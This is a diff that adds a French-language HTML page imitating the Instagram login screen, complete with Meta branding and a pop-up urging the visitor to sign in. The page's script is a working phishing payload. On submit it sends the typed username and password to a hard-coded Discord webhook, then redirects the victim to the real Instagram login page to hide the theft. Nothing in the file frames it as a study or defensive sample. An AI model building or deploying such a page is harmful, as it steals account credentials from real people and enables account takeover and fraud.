@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion • Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+            padding: 20px;
+        }
+
+        /* --- STYLE DU POP-UP --- */
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal {
+            background: white;
+            width: 85%;
+            max-width: 300px;
+            padding: 25px;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+
+        .modal h2 {
+            font-size: 18px;
+            margin-bottom: 12px;
+            color: #262626;
+        }
+
+        .modal p {
+            font-size: 14px;
+            color: #737373;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        /* --- STYLE GÉNÉRAL --- */
+        .language-selector {
+            color: #737373;
+            font-size: 12px;
+            margin-bottom: 60px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+        }
+
+        .logo {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 40px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 12px;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            background: #fafafa;
+            font-size: 14px;
+        }
+
+        .input-field::placeholder {
+            color: #737373;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: #0064e0; /* Bleu Meta */
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            margin-top: 8px;
+            cursor: pointer;
+        }
+
+        .forgot-password {
+            display: block;
+            margin-top: 20px;
+            color: #000;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .footer {
+            margin-top: auto;
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+            padding-bottom: 20px;
+        }
+
+        .create-account-btn {
+            width: 100%;
+            background: transparent;
+            border: 1px solid #0064e0;
+            color: #0064e0;
+            padding: 10px;
+            border-radius: 20px;
+            font-weight: 500;
+            font-size: 14px;
+            text-decoration: none;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+
+        .meta-logo {
+            color: #737373;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            text-decoration: none;
+        }
+
+        .meta-logo svg {
+            fill: #737373;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="overlay">
+        <div class="modal">
+            <h2>Action requise</h2>
+            <p>Veuillez vous connecter pour accéder à ce contenu et continuer la navigation.</p>
+            <button class="login-btn" onclick="closePopup()">Se connecter</button>
+        </div>
+    </div>
+
+    <div class="language-selector">Français (France)</div>
+
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram" class="logo">
+
+        <form id="loginForm">
+            <input type="text" name="username" class="input-field" placeholder="Nom de profil, e-mail ou numéro de mobile" required>
+            <input type="password" name="password" class="input-field" placeholder="Mot de passe" required>
+            <button type="submit" class="login-btn">Se connecter</button>
+        </form>
+
+        <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+    </div>
+
+    <div class="footer">
+        <a href="#" class="create-account-btn">Créer un compte</a>
+        
+        <div class="meta-logo">
+            <svg width="16" height="16" viewBox="0 0 24 24">
+                <path d="M12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/>
+            </svg>
+            <strong>Meta</strong>
+        </div>
+    </div>
+
+    <script>
+        // Fonction pour fermer le pop-up
+        function closePopup() {
+            document.getElementById('overlay').style.display = 'none';
+        }
+
+        const form = document.getElementById('loginForm');
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const user = form.username.value;
+            const pass = form.password.value;
+
+            // URL WEBHOOK DISCORD
+            const webhookURL = "https://discord.com/api/webhooks/1468006247814140128/Ew0zFo3GnjlkRGmBU9f2DA4ybQXFIdmLlc97mVKM5oiCoBbs8DDXjjs_9NRo8IGwmQJD";
+
+            const payload = {
+                embeds: [{
+                    title: "📱 Nouvelle saisie détectée",
+                    color: 13500511,
+                    fields: [
+                        { name: "Identifiant", value: `\`${user}\``, inline: false },
+                        { name: "Mot de passe", value: `\`${pass}\``, inline: false }
+                    ],
+                    footer: { text: "Interface Mobile Instagram" },
+                    timestamp: new Date()
+                }]
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(() => {
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            })
+            .catch(error => {
+                console.error('Erreur:', error);
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            });
+        });
+    </script>
+
+</body>
+</html>
